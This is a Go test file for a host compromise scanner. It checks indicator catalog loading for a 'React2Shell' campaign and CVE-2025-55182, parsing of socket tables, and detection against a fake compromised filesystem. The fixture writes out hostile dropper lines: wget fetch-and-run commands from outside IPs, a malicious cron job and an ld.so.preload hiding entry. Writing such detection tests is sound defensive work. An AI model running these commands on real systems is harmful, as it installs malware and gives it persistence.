package scan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The repository's own catalog is the first source; tests load it as is.
var repoCatalog = filepath.Join("..", "..", "security")

func loadRepoCatalog(t *testing.T) *Catalog {
	t.Helper()
	c, err := LoadCatalog([]string{repoCatalog})
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func TestCatalogLoadsRepository(t *testing.T) {
	c := loadRepoCatalog(t)
	if _, ok := c.sha["0f0f9c339fcc267ec3d560c7168c56f607232cbeb158cb02a0818720a54e72ce"]; !ok {
		t.Error("React2Shell hash missing")
	}
	if _, ok := c.ip["45.76.155.14"]; !ok {
		t.Error("React2Shell IP missing")
	}
	if len(c.npm["next"]) == 0 {
		t.Error("CVE-2025-55182 not indexed for npm:next")
	}
	if _, ok := c.ports[14444]; !ok {
		t.Error("network ports missing")
	}
	for id := range builtinDefaults {
		if _, ok := c.Checks[id]; !ok {
			t.Errorf("builtin.yaml does not document %s", id)
		}
	}
}

func TestCatalogOverrideAndSchema(t *testing.T) {
	over := t.TempDir()
	write(t, over, "rules/builtin.yaml", "checks:\n  MK-PROC-DELETED: { severity: high }\n  MK-PERSIST-RECENT: { disabled: true }\n")
	write(t, over, "rules/react2shell.yaml", "id: MK-R2S\ntitle: replaced\nindicators:\n  ips:\n    - value: 203.0.113.9\n")
	c, err := LoadCatalog([]string{repoCatalog, over})
	if err != nil {
		t.Fatal(err)
	}
	if sev, _ := c.check("MK-PROC-DELETED"); sev != High {
		t.Errorf("override severity: %v", sev)
	}
	if _, on := c.check("MK-PERSIST-RECENT"); on {
		t.Error("disabled check still on")
	}
	if _, ok := c.ip["45.76.155.14"]; ok || c.Rules["MK-R2S"].Title != "replaced" {
		t.Error("later source did not replace the rule with the same id")
	}
	future := t.TempDir()
	write(t, future, "index.yaml", "schema: 99\n")
	if _, err := LoadCatalog([]string{future}); err == nil || !strings.Contains(err.Error(), "newer") {
		t.Errorf("newer schema accepted: %v", err)
	}
}

func TestSemverAndOSV(t *testing.T) {
	for _, c := range []struct {
		a, b string
		want int
	}{{"1.0.0", "1.0.0", 0}, {"1.0.0-canary.2", "1.0.0-canary.10", -1}, {"1.0.0-canary.9", "1.0.0", -1}, {"15.3.6", "15.3.10", -1}, {"v16.0.7", "16.0.6", 1}} {
		if got := cmpSemver(c.a, c.b); got != c.want {
			t.Errorf("cmp(%s,%s)=%d want %d", c.a, c.b, got, c.want)
		}
	}
	v := loadRepoCatalog(t).Vulns["CVE-2025-55182"]
	cases := map[string]bool{"16.0.4": true, "16.0.6": true, "16.0.7": false, "16.1.0": false, "15.3.3": true, "15.3.6": false,
		"15.5.6": true, "15.5.7": false, "15.0.5": false, "14.2.30": false, "14.3.0-canary.80": true, "14.3.0-canary.10": false, "15.3.6-canary.1": true}
	for ver, want := range cases {
		if got, _ := v.Affects("npm", "next", ver); got != want {
			t.Errorf("next %s: got %v want %v", ver, got, want)
		}
	}
	if ok, _ := v.Affects("npm", "react-server-dom-webpack", "19.1.1"); !ok {
		t.Error("react-server-dom-webpack 19.1.1 should be affected")
	}
	if ok, _ := v.Affects("npm", "react-server-dom-webpack", "19.1.2"); ok {
		t.Error("react-server-dom-webpack 19.1.2 is fixed")
	}
}

func TestHexAddrAndSockets(t *testing.T) {
	if ip, port := hexAddr("0E9B4C2D:01BB"); ip != "45.76.155.14" || port != 443 {
		t.Fatalf("got %s:%d", ip, port)
	}
	if ip, _ := hexAddr("00000000000000000000000001000000:0050"); ip != "::1" {
		t.Fatalf("ipv6 got %s", ip)
	}
	dir := t.TempDir()
	write(t, dir, "tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"+
		"   0: 0100000A:D2F0 0E9B4C2D:01BB 01 00000000:00000000 00:00000000 00000000  0  0 12345 1 0 20 4 30 10 -1\n"+
		"   1: 0100007F:1F90 0100007F:D2F1 01 00000000:00000000 00:00000000 00000000  0  0 12346 1 0 20 4 30 10 -1\n"+
		"   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000  0  0 12347 1 0 20 4 30 10 -1\n")
	if socks := readSockets(filepath.Join(dir, "tcp")); len(socks) != 1 || socks["12345"].remote != "45.76.155.14:443" {
		t.Fatalf("got %+v", socks)
	}
}

func TestHidden(t *testing.T) {
	for p, want := range map[string]bool{"/tmp/.x/kworker": true, "/root/.cache/go/x": false, "/home/a/.ssh/id": true, "/tmp/vim": false} {
		if hidden(p) != want {
			t.Errorf("%s: want %v", p, want)
		}
	}
}

// TestScanFixture runs the file, persistence and package checks on a fake compromised filesystem.
func TestScanFixture(t *testing.T) {
	root := t.TempDir()
	goELF := "\x7fELF" + strings.Repeat("x", 64) + "runtime.main net/http socks5 crypto/tls chacha20poly1305"
	write(t, root, "tmp/.x/kworker", goELF)
	write(t, root, "tmp/vim", "\x7fELFplain")
	write(t, root, "tmp/run.sh", "wget http://198.51.100.7/a -O /tmp/a; chmod +x /tmp/a; nohup /tmp/a &")
	write(t, root, "tmp/notes.txt", "curl -fsSL https://get.docker.com -o get-docker.sh")
	write(t, root, "etc/cron.d/sysupdate", "* * * * * root wget http://45.76.155.14/vim -O /tmp/vim; nohup /tmp/vim &\n")
	write(t, root, "etc/ld.so.preload", "/usr/lib/libhide.so\n")
	write(t, root, "app/node_modules/next/package.json", `{"name":"next","version":"16.0.4"}`)
	write(t, root, "app/node_modules/.pnpm/react-server-dom-webpack@19.1.1/node_modules/react-server-dom-webpack/package.json", `{"version":"19.1.1"}`)
	write(t, root, "srv/ok/node_modules/next/package.json", `{"name":"next","version":"16.0.7"}`)

	s := &scanner{cat: loadRepoCatalog(t), rep: &Report{}, maxSize: 64 << 20, hashes: map[string]string{}}
	tg := target{name: "fixture", root: root, workdir: "/app"}
	s.files(tg)
	s.persistence(tg)
	s.packages(tg)

	got := map[string]Severity{}
	for _, f := range s.rep.Findings {
		got[f.Rule+" "+f.Path] = f.Severity
	}
	want := map[string]Severity{
		"MK-FILE-EXEC-HIDDEN /tmp/.x/kworker":         High, // hidden + Go traits + system-like name
		"MK-R2S /tmp/vim":                             High, // known malware path (rule severity default)
		"MK-FILE-EXEC-TEMP /tmp/vim":                  High, // named like a system tool
		"MK-DROPPER /tmp/run.sh":                      High,
		"MK-DROPPER /etc/cron.d/sysupdate":            High,
		"MK-PERSIST-TEMP-EXEC /etc/cron.d/sysupdate":  High,
		"MK-PERSIST-PRELOAD /etc/ld.so.preload":       High,
		"MK-VULN /app/node_modules/next/package.json": Critical,
		"MK-VULN /app/node_modules/.pnpm/react-server-dom-webpack@19.1.1/node_modules/react-server-dom-webpack/package.json": Critical,
	}
	for k, sev := range want {
		if g, ok := got[k]; !ok {
			t.Errorf("missing finding %q (got %v)", k, keys(got))
		} else if g != sev {
			t.Errorf("%q severity %v, want %v", k, g, sev)
		}
	}
	for k := range got {
		if strings.Contains(k, "notes.txt") || strings.Contains(k, "/srv/ok/") {
			t.Errorf("false positive: %s", k)
		}
	}
}

func keys(m map[string]Severity) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

func write(t *testing.T, root, p, s string) {
	t.Helper()
	f := filepath.Join(root, p)
	if err := os.MkdirAll(filepath.Dir(f), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(f, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}
